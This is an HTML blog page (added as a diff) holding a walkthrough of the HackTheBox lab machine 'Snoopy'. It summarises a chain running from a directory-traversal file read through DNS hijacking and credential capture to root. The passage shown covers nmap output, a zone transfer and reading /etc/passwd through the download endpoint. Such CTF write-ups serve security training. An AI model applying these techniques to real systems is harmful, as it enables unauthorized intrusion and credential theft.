@@ -1,0 +1,1862 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Snoopy is a hard difficulty box with a download function vulnerable to directory traversal, resulting in Arbitrary File Read. Additionally, the DNS server is configured to allow DNS updates from anybody carrying the rndc key. Using the Arbitrary File Read, we uncover the key and update Snoopy's mailserver to our own IP address. While receiving Snoopy's mail, we can request a password reset for a MatterMost account. Within the MatterMost channels is a custom command where we might submit new machines and addresses to be configured for the server. Using an SSH Honeypot, we can record the login attempts performed as someone tries to access our machine for the configuration. Using these credentials, we finally access the machine. We can abuse a git apply command to overwrite a user's authorized_keys with our own public key, and authenticate as that user. Lastly, we can abuse sudo privileges as root to perform a virus scan with a very generic virus signature list, and send our \"infected\" authorized_keys file straight to the /root/.ssh/ folder, allowing us to authenticate as root.">
+<title>HackTheBox - Snoopy</title>
+
+<link rel='canonical' href='http://localhost:1313/p/hackthebox-snoopy/'>
+
+<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="HackTheBox - Snoopy">
+<meta property='og:description' content="Snoopy is a hard difficulty box with a download function vulnerable to directory traversal, resulting in Arbitrary File Read. Additionally, the DNS server is configured to allow DNS updates from anybody carrying the rndc key. Using the Arbitrary File Read, we uncover the key and update Snoopy's mailserver to our own IP address. While receiving Snoopy's mail, we can request a password reset for a MatterMost account. Within the MatterMost channels is a custom command where we might submit new machines and addresses to be configured for the server. Using an SSH Honeypot, we can record the login attempts performed as someone tries to access our machine for the configuration. Using these credentials, we finally access the machine. We can abuse a git apply command to overwrite a user's authorized_keys with our own public key, and authenticate as that user. Lastly, we can abuse sudo privileges as root to perform a virus scan with a very generic virus signature list, and send our \"infected\" authorized_keys file straight to the /root/.ssh/ folder, allowing us to authenticate as root.">
+<meta property='og:url' content='http://localhost:1313/p/hackthebox-snoopy/'>
+<meta property='og:site_name' content='Spencer&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Arbitrary File Read' /><meta property='article:tag' content='DNS' /><meta property='article:tag' content='Postfix' /><meta property='article:tag' content='Zone Transfer' /><meta property='article:tag' content='nsupdate' /><meta property='article:tag' content='MatterMost' /><meta property='article:tag' content='SSH Honeypot' /><meta property='article:tag' content='Cowrie' /><meta property='article:tag' content='git' /><meta property='article:tag' content='ClamAV' /><meta property='article:tag' content='clamscan' /><meta property='article:published_time' content='2023-09-23T11:09:31-05:00'/><meta property='article:modified_time' content='2023-09-23T11:09:31-05:00'/><meta property='og:image' content='http://localhost:1313/p/hackthebox-snoopy/Snoopy.png' />
+<meta name="twitter:title" content="HackTheBox - Snoopy">
+<meta name="twitter:description" content="Snoopy is a hard difficulty box with a download function vulnerable to directory traversal, resulting in Arbitrary File Read. Additionally, the DNS server is configured to allow DNS updates from anybody carrying the rndc key. Using the Arbitrary File Read, we uncover the key and update Snoopy's mailserver to our own IP address. While receiving Snoopy's mail, we can request a password reset for a MatterMost account. Within the MatterMost channels is a custom command where we might submit new machines and addresses to be configured for the server. Using an SSH Honeypot, we can record the login attempts performed as someone tries to access our machine for the configuration. Using these credentials, we finally access the machine. We can abuse a git apply command to overwrite a user's authorized_keys with our own public key, and authenticate as that user. Lastly, we can abuse sudo privileges as root to perform a virus scan with a very generic virus signature list, and send our \"infected\" authorized_keys file straight to the /root/.ssh/ folder, allowing us to authenticate as root."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='http://localhost:1313/p/hackthebox-snoopy/Snoopy.png' />
+    <link rel="shortcut icon" href="/favicon.png" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu897059592634026878.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Spencer&#39;s Blog</a></h1>
+            <h2 class="site-description">Lorem ipsum dolor sit amet, consectetur adipiscing elit.</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/post' >
+                
+                
+                
+                <span>Posts</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/awards' >
+                
+                
+                
+                <span>Trophy Room</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#enumeration">Enumeration</a>
+      <ol>
+        <li><a href="#enumerating-subdomains-via-zone-transfer">Enumerating subdomains via zone transfer</a></li>
+        <li><a href="#file-read-vulnerability-in-download">File Read Vulnerability in download</a></li>
+        <li><a href="#snoopys-mailserver-is-being-migrated">Snoopy&rsquo;s mailserver is being migrated</a></li>
+        <li><a href="#enumerating-dns-bind-configurations">Enumerating DNS bind configurations</a></li>
+        <li><a href="#updating-mailsnoopyhtb">Updating mail.snoopy.htb</a></li>
+        <li><a href="#using-postfix-to-receive-the-password-reset-email">Using Postfix to receive the password reset email</a></li>
+      </ol>
+    </li>
+    <li><a href="#foothold">Foothold</a>
+      <ol>
+        <li><a href="#enumerating-mattermost-chat-histories">Enumerating MatterMost chat histories</a></li>
+        <li><a href="#using-cowrie-to-establish-an-ssh-honeypot">Using Cowrie to establish an SSH honeypot</a></li>
+      </ol>
+    </li>
+    <li><a href="#lateral-movement">Lateral Movement</a>
+      <ol>
+        <li><a href="#leveraging-git-apply-to-patch-files-outside-of-git-repository">Leveraging git apply to patch files outside of git repository</a></li>
+      </ol>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a>
+      <ol>
+        <li><a href="#abusing-clamav-scanning-to-rewrite-authorized_keys">Abusing ClamAV scanning to rewrite authorized_keys</a></li>
+      </ol>
+    </li>
+    <li><a href="#reflection">Reflection</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/hackthebox-snoopy/">
+                <img src="/p/hackthebox-snoopy/Snoopy_hu7142032297605372832.png"
+                        srcset="/p/hackthebox-snoopy/Snoopy_hu7142032297605372832.png 800w, /p/hackthebox-snoopy/Snoopy_hu8528509556847445209.png 1600w"
+                        width="800" 
+                        height="606" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Snoopy" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/hack-the-box/" >
+                Hack the Box
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/hackthebox-snoopy/">HackTheBox - Snoopy</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            Snoopy is a hard difficulty box with a download function vulnerable to directory traversal, resulting in Arbitrary File Read. Additionally, the DNS server is configured to allow DNS updates from anybody carrying the rndc key. Using the Arbitrary File Read, we uncover the key and update Snoopy&#39;s mailserver to our own IP address. While receiving Snoopy&#39;s mail, we can request a password reset for a MatterMost account. Within the MatterMost channels is a custom command where we might submit new machines and addresses to be configured for the server. Using an SSH Honeypot, we can record the login attempts performed as someone tries to access our machine for the configuration. Using these credentials, we finally access the machine. We can abuse a git apply command to overwrite a user&#39;s authorized_keys with our own public key, and authenticate as that user. Lastly, we can abuse sudo privileges as root to perform a virus scan with a very generic virus signature list, and send our &#34;infected&#34; authorized_keys file straight to the /root/.ssh/ folder, allowing us to authenticate as root.
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Sep 23, 2023</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    15 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="enumeration">Enumeration
+</h2><p>Initial nmap:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Starting Nmap 7.94 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-05-07 20:21 EDT
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.212
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.043s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">62463</span> closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>, <span class="m">3069</span> filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> ee:6b:ce:c5:b6:e3:fa:1b:97:c0:3d:5f:e3:f1:a1:6e <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 54:59:41:e1:71:9a:1a:87:9c:1e:99:50:59:bf:e5:ba <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">53/tcp open  domain  ISC BIND 9.18.12-0ubuntu0.22.04.1 <span class="o">(</span>Ubuntu Linux<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> dns-nsid: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  bind.version: 9.18.12-0ubuntu0.22.04.1-Ubuntu
+</span></span><span class="line"><span class="cl">80/tcp open  http    nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: SnoopySec Bootstrap Template - Index
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 34.45 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>There is port 53 open, so zone transfer might be possible</p>
+<p>Examining the webpage appears to be a mostly functional website for SnoopySec:</p>
+<p><img src="/p/hackthebox-snoopy/Images/Homepage.png"
+	width="1340"
+	height="636"
+	srcset="/p/hackthebox-snoopy/Images/Homepage_hu8781228600077951250.png 480w, /p/hackthebox-snoopy/Images/Homepage_hu7274563352405482687.png 1024w"
+	loading="lazy"
+	
+		alt="Home page"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="210"
+		data-flex-basis="505px"
+	
+></p>
+<p>Checking the link for their recent announcement, we can see a reference to a download function: <code>http://snoopy.htb/download?file=announcement.pdf</code></p>
+<p>Firstly to make the process seamless, I add snoopy.htb into my hosts file. This might also become important if we need to interact with the DNS server:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/Snoopy<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ tail /etc/hosts                 
+</span></span><span class="line"><span class="cl">127.0.0.1       localhost
+</span></span><span class="line"><span class="cl">127.0.1.1       kali
+</span></span><span class="line"><span class="cl">::1             localhost ip6-localhost ip6-loopback
+</span></span><span class="line"><span class="cl">ff02::1         ip6-allnodes
+</span></span><span class="line"><span class="cl">ff02::2         ip6-allrouters
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">10.10.11.212 snoopy.htb
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Viewing the announcement.pdf file, we can find an employee name in the signature without much useful information:</p>
+<p><img src="/p/hackthebox-snoopy/Images/announcement.png"
+	width="195"
+	height="172"
+	srcset="/p/hackthebox-snoopy/Images/announcement_hu12250351599526476772.png 480w, /p/hackthebox-snoopy/Images/announcement_hu11194144723279734738.png 1024w"
+	loading="lazy"
+	
+		alt="The pdf is signed off by Sally, part of SnoopySec PR"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="113"
+		data-flex-basis="272px"
+	
+></p>
+<h3 id="enumerating-subdomains-via-zone-transfer">Enumerating subdomains via zone transfer
+</h3><p>With the DNS server name, we can attempt a zone transfer with <code>dig</code> to determine all subdomains:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/Snoopy/press_package<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ dig AXFR @10.10.11.212 snoopy.htb  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">;</span> &lt;&lt;&gt;&gt; DiG 9.18.16-1-Debian &lt;&lt;&gt;&gt; AXFR @10.10.11.212 snoopy.htb
+</span></span><span class="line"><span class="cl"><span class="p">;</span> <span class="o">(</span><span class="m">1</span> server found<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">;;</span> global options: +cmd
+</span></span><span class="line"><span class="cl">snoopy.htb.             <span class="m">86400</span>   IN      SOA     ns1.snoopy.htb. ns2.snoopy.htb. <span class="m">2022032612</span> <span class="m">3600</span> <span class="m">1800</span> <span class="m">604800</span> <span class="m">86400</span>
+</span></span><span class="line"><span class="cl">snoopy.htb.             <span class="m">86400</span>   IN      NS      ns1.snoopy.htb.
+</span></span><span class="line"><span class="cl">snoopy.htb.             <span class="m">86400</span>   IN      NS      ns2.snoopy.htb.
+</span></span><span class="line"><span class="cl">mattermost.snoopy.htb.  <span class="m">86400</span>   IN      A       172.18.0.3
+</span></span><span class="line"><span class="cl">mm.snoopy.htb.          <span class="m">86400</span>   IN      A       127.0.0.1
+</span></span><span class="line"><span class="cl">ns1.snoopy.htb.         <span class="m">86400</span>   IN      A       10.0.50.10
+</span></span><span class="line"><span class="cl">ns2.snoopy.htb.         <span class="m">86400</span>   IN      A       10.0.51.10
+</span></span><span class="line"><span class="cl">postgres.snoopy.htb.    <span class="m">86400</span>   IN      A       172.18.0.2
+</span></span><span class="line"><span class="cl">provisions.snoopy.htb.  <span class="m">86400</span>   IN      A       172.18.0.4
+</span></span><span class="line"><span class="cl">www.snoopy.htb.         <span class="m">86400</span>   IN      A       127.0.0.1
+</span></span><span class="line"><span class="cl">snoopy.htb.             <span class="m">86400</span>   IN      SOA     ns1.snoopy.htb. ns2.snoopy.htb. <span class="m">2022032612</span> <span class="m">3600</span> <span class="m">1800</span> <span class="m">604800</span> <span class="m">86400</span>
+</span></span><span class="line"><span class="cl"><span class="p">;;</span> Query time: <span class="m">44</span> msec
+</span></span><span class="line"><span class="cl"><span class="p">;;</span> SERVER: 10.10.11.212#53<span class="o">(</span>10.10.11.212<span class="o">)</span> <span class="o">(</span>TCP<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">;;</span> WHEN: Sun May <span class="m">07</span> 20:48:53 EDT <span class="m">2023</span>
+</span></span><span class="line"><span class="cl"><span class="p">;;</span> XFR size: <span class="m">11</span> records <span class="o">(</span>messages 1, bytes 325<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We see several subdomains, particularly <code>provisions.snoopy.htb</code>, <code>mm.snoopy.htb</code> and <code>mattermost.snoopy.htb</code>. We can add these to our /etc/hosts file as well.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">10.10.11.212 snoopy.htb mattermost.snoopy.htb mm.snoopy.htb postgres.snoopy.htb provisions.snoopy.htb
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Since ns1 and ns2 are related to name servers, they will not be useful as subdomains.</p>
+<p>When we check out these addresses, we see <code>mm.snoopy.htb</code> points to a different page:</p>
+<p><img src="/p/hackthebox-snoopy/Images/mmlogin.png"
+	width="1471"
+	height="685"
+	srcset="/p/hackthebox-snoopy/Images/mmlogin_hu5067389608087333534.png 480w, /p/hackthebox-snoopy/Images/mmlogin_hu15043767966663554395.png 1024w"
+	loading="lazy"
+	
+		alt="MatterMost landing page"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="214"
+		data-flex-basis="515px"
+	
+></p>
+<p>Trying weak credentials does not work, so it seems there is not much we can do here.</p>
+<h3 id="file-read-vulnerability-in-download">File Read Vulnerability in download
+</h3><p>Returning to the download function, we can explore directory traversal techniques for a file read vulnerability. There is still a resulting download occurring, but the size is 0:</p>
+<p><img src="/p/hackthebox-snoopy/Images/passwd.png"
+	width="1606"
+	height="198"
+	srcset="/p/hackthebox-snoopy/Images/passwd_hu13291298459787161712.png 480w, /p/hackthebox-snoopy/Images/passwd_hu11130053045579082994.png 1024w"
+	loading="lazy"
+	
+		alt="Attempting to download /etc/passwd"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="811"
+		data-flex-basis="1946px"
+	
+></p>
+<p>We can also confirm this is empty in the command line:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/Snoopy<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ file ~/Downloads/press_release.zip 
+</span></span><span class="line"><span class="cl">/home/kali/Downloads/press_release.zip: empty
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Although we are not getting /etc/passwd, we are still doing a download operation; there is no server error. When trying for simple filter bypasses, we land on a combination that works:</p>
+<p><img src="/p/hackthebox-snoopy/Images/passwd2.png"
+	width="1163"
+	height="111"
+	srcset="/p/hackthebox-snoopy/Images/passwd2_hu12881967033806127313.png 480w, /p/hackthebox-snoopy/Images/passwd2_hu297552318555570816.png 1024w"
+	loading="lazy"
+	
+		alt="Download filter bypass"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1047"
+		data-flex-basis="2514px"
+	
+></p>
+<p>The file is still delivered as press_release.zip</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/Snoopy<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ unzip press_release.zip 
+</span></span><span class="line"><span class="cl">Archive:  press_release.zip
+</span></span><span class="line"><span class="cl">  inflating: press_package/etc/passwd  
+</span></span><span class="line"><span class="cl">                                                                                                                                                                                                                                            
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/Snoopy<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ cat press_package/etc/passwd 
+</span></span><span class="line"><span class="cl">root:x:0:0:root:/root:/bin/bash
+</span></span><span class="line"><span class="cl">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">bin:x:2:2:bin:/bin:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl">cbrown:x:1000:1000:Charlie Brown:/home/cbrown:/bin/bash
+</span></span><span class="line"><span class="cl">sbrown:x:1001:1001:Sally Brown:/home/sbrown:/bin/bash
+</span></span><span class="line"><span class="cl">clamav:x:1002:1003::/home/clamav:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">lpelt:x:1003:1004::/home/lpelt:/bin/bash
+</span></span><span class="line"><span class="cl">cschultz:x:1004:1005:Charles Schultz:/home/cschultz:/bin/bash
+</span></span><span class="line"><span class="cl">vgray:x:1005:1006:Violet Gray:/home/vgray:/bin/bash
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Even though it is delivered as a zip, we are still sent the contents of /etc/passwd. From the passwd file we can see users on the box including <code>sbrown</code>, likely the account name for the PR contact Sally Brown.</p>
+<h3 id="snoopys-mailserver-is-being-migrated">Snoopy&rsquo;s mailserver is being migrated
+</h3><p>Further enumeration of source code files did not provide more insight, however when we explore the contact page of <code>snoopy.htb</code> we see an interesting notice:</p>
+<p><img src="/p/hackthebox-snoopy/Images/contact_notice.png"
+	width="1287"
+	height="100"
